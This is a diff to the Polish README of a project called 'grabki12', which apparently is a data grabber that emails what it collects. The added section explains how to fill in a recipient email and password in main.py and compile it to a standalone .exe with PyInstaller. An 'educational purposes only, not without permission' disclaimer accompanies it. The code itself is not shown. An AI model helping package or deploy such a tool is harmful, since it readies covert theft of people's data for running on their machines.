@@ -48,5 +48,28 @@ cd grabki12
 python main.py
 ```
 
+## Porady 👍:
+-Najlepiej jak skompilujesz program do .exe jeżeli chcesz korzystac z programu bez pythona.
+-Zanim skompilujesz do .exe wpisz w odpowiednie pola odpowidnie informacje takie jak mail odpbiorcy, adresat,hasło.
+-Jak skompilowac do exe? To bradzo proste! Poniżej znajdziesz poradnik:
+1. Uruchom terminal shell (windows)
+2. Pobierz pyinstaller (jeśli nie masz)
+```
+pip install pyinstaller
+```
+3. Przejdź do katalogu grabki12
+```
+cd ~\grabki12
+```
+4.Wpisz polecene pyinstaller
+```
+pyinstaller main.py
+```
+5. Powinneś uzyskać 2 nowe foldery i jedn plik
+6. Skopiuj w inne miejsce folder build a później mozesz usunąć reszcze plików.
+UPEWNIJ SIĘ ŻE WCZEŚNIEJ UZUPEŁNIŁĘŚ BRAKUJĄCE MIEJSCA W PLIK main.py!!!
+Teraz powinneś mieć w folderze build main i tak plik .exe
+Jeżeli go uruchomisz wszystko zadziała tak jak trzeba :)
+
 ## W celach edukacyjnych TYLKO 🤓
 Nie używaj na drugiej osobie bez jej pozwolenia!
